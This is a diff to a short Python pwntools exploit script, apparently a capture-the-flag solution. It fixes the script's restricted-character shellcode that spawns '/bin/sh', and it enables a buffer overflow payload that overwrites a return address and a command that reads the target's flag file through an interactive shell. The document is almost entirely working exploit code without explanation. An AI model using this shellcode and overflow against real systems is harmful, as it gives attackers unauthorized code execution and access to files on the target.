@@ -51,17 +51,19 @@ Y   = pop rcx
 
 name = 0x6010c0 # 0x601100 = 0x3b395a3b ^ 0x3b594b3b
 
-sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5\x00;;;;PYYYT_j;X'
+sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5;;;;PYYYT_j;X'
 sc = sc + 'Y' * ( 0x50 - len( sc ) ) + '/bin/sh'
 
 print len( sc )
 
 y.sendafter( ']:' , sc )
 
-#y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )
+sleep(1)
+
+y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )
 
 sleep(1)
 
-#y.sendline( 'cat /home/`whoami`/flag' )
+y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
